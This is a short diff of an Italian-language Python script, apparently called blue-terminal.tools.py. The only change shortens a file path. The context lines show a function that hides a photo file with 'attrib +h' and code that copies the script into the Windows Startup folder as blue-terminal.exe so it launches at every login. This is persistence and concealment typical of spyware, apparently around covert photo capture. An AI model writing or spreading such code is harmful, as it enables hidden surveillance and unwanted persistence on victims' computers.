@@ -47,7 +47,7 @@ def foto():
 def nascondi():
     file="foto.png"
     os.system(f"attrib +h {file}")
-percorso = r"C:\Users\blue-terminal\Desktop\python\blue-terminal.tools.py"
+percorso = r"C:\Users\blue-terminal.tools.py"
 avviosiste = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
 shutil.copy2(percorso, os.path.join(avviosiste, "blue-terminal.exe"))
 ascii = GLOW+TOXIC_GREEN +"""
